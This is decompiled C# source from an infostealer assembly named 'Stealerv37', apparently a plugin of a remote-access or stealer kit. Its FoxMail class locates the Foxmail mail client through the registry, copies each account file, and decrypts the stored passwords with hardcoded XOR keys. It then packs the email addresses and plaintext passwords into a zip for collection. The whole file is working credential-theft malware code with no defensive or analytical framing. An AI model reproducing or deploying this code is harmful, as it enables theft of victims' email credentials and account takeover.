// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.FoxMail
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.IO;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class FoxMail : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command");
    if (registryKey == null)
      return;
    string str1 = registryKey.GetValue("") as string;
    if (string.IsNullOrEmpty(str1))
      return;
    int length = str1.LastIndexOf("Foxmail.exe", StringComparison.OrdinalIgnoreCase);
    if (length < 0)
      return;
    string path = Path.Combine(str1.Substring(0, length).Replace("\"", "").TrimEnd('\\', ' '), "Storage");
    if (!Directory.Exists(path))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (FoxMail);
    foreach (string directory in Directory.GetDirectories(path, "*@*", SearchOption.TopDirectoryOnly))
    {
      string fileName = Path.GetFileName(directory);
      string str2 = Path.Combine(directory, "Accounts");
      if (Directory.Exists(str2))
      {
        string str3 = Path.Combine(str2, "Account.rec0");
        if (File.Exists(str3))
        {
          string str4 = Path.Combine(Path.GetTempPath(), $"Account_{Guid.NewGuid():N}.rec");
          File.Copy(str3, str4, true);
          bool found;
          int ver;
          string fileAndGetPassword = this.ParseSecretFileAndGetPassword(str4, out found, out ver);
          if (found)
          {
            string entryPath = $"Foxmail\\{fileName}\\Account.txt";
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("E-Mail: " + fileName);
            stringBuilder.AppendLine("Password: " + fileAndGetPassword);
            stringBuilder.AppendLine("FoxmailVersionDetected: " + (ver == 0 ? "6.x" : "7.x or later"));
            zip.AddTextFile(entryPath, stringBuilder.ToString());
            counterApplications.Files.Add($"{str3} => {entryPath}");
          }
          else
          {
            string entryPath = $"Foxmail\\{fileName}\\Account.rec0";
            zip.AddFile(entryPath, File.ReadAllBytes(str3));
            counterApplications.Files.Add($"{str3} => {entryPath}");
          }
          File.Delete(str4);
        }
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counter.Applications.Add(counterApplications);
  }

  private string ParseSecretFileAndGetPassword(string path, out bool found, out int ver)
  {
    found = false;
    ver = 1;
    byte[] bits = File.ReadAllBytes(path);
    if (bits == null || bits.Length == 0)
      return string.Empty;
    ver = bits[0] != (byte) 208 /*0xD0*/ ? 1 : 0;
    string str1 = "";
    string str2 = "";
    for (int jx = 0; jx < bits.Length; ++jx)
    {
      byte num = bits[jx];
      if (num > (byte) 32 /*0x20*/ && num < (byte) 127 /*0x7F*/ && num != (byte) 61)
      {
        str1 += ((char) num).ToString();
        if (str1.Equals("Account", StringComparison.Ordinal))
        {
          str2 = this.ReadAsciiValue(bits, ref jx, ver);
          str1 = "";
        }
        else if (str1.Equals("POP3Account", StringComparison.Ordinal))
        {
          str2 = this.ReadAsciiValue(bits, ref jx, ver);
          str1 = "";
        }
        else if ((str1.Equals("Password", StringComparison.Ordinal) || str1.Equals("POP3Password", StringComparison.Ordinal)) && !string.IsNullOrEmpty(str2))
        {
          string strHash = this.ReadAsciiValue(bits, ref jx, ver);
          string fileAndGetPassword = this.DecodePW(ver, strHash);
          found = true;
          return fileAndGetPassword;
        }
      }
      else
        str1 = "";
    }
    return string.Empty;
  }

  private string ReadAsciiValue(byte[] bits, ref int jx, int ver)
  {
    int index = jx + 9;
    if (ver == 0)
      index = jx + 2;
    StringBuilder stringBuilder = new StringBuilder();
    for (; index < bits.Length && bits[index] > (byte) 32 /*0x20*/ && bits[index] < (byte) 127 /*0x7F*/; ++index)
      stringBuilder.Append((char) bits[index]);
    jx = index;
    return stringBuilder.ToString();
  }

  private string DecodePW(int ver, string strHash)
  {
    string empty = string.Empty;
    int[] sourceArray1;
    int int32;
    if (ver == 0)
    {
      sourceArray1 = new int[8]
      {
        126,
        100,
        114,
        97,
        71,
        111,
        110,
        126
      };
      int32 = Convert.ToInt32("5A", 16 /*0x10*/);
    }
    else
    {
      sourceArray1 = new int[8]
      {
        126,
        70,
        64 /*0x40*/,
        55,
        37,
        109,
        36,
        126
      };
      int32 = Convert.ToInt32("71", 16 /*0x10*/);
    }
    int length = strHash.Length / 2;
    int startIndex = 0;
    int[] sourceArray2 = new int[length];
    for (int index = 0; index < length; ++index)
    {
      sourceArray2[index] = Convert.ToInt32(strHash.Substring(startIndex, 2), 16 /*0x10*/);
      startIndex += 2;
    }
    int[] destinationArray1 = new int[sourceArray2.Length];
    destinationArray1[0] = sourceArray2[0] ^ int32;
    if (sourceArray2.Length > 1)
      Array.Copy((Array) sourceArray2, 1, (Array) destinationArray1, 1, sourceArray2.Length - 1);
    int[] destinationArray2;
    for (; sourceArray2.Length > sourceArray1.Length; sourceArray1 = destinationArray2)
    {
      destinationArray2 = new int[sourceArray1.Length * 2];
      Array.Copy((Array) sourceArray1, 0, (Array) destinationArray2, 0, sourceArray1.Length);
      Array.Copy((Array) sourceArray1, 0, (Array) destinationArray2, sourceArray1.Length, sourceArray1.Length);
    }
    int[] numArray1 = new int[sourceArray2.Length];
    for (int index = 1; index < sourceArray2.Length; ++index)
      numArray1[index - 1] = sourceArray2[index] ^ sourceArray1[index - 1];
    int[] numArray2 = new int[numArray1.Length];
    for (int index = 0; index < numArray1.Length - 1; ++index)
    {
      numArray2[index] = numArray1[index] - destinationArray1[index] >= 0 ? numArray1[index] - destinationArray1[index] : numArray1[index] + (int) byte.MaxValue - destinationArray1[index];
      empty += ((char) numArray2[index]).ToString();
    }
    return empty;
  }
}
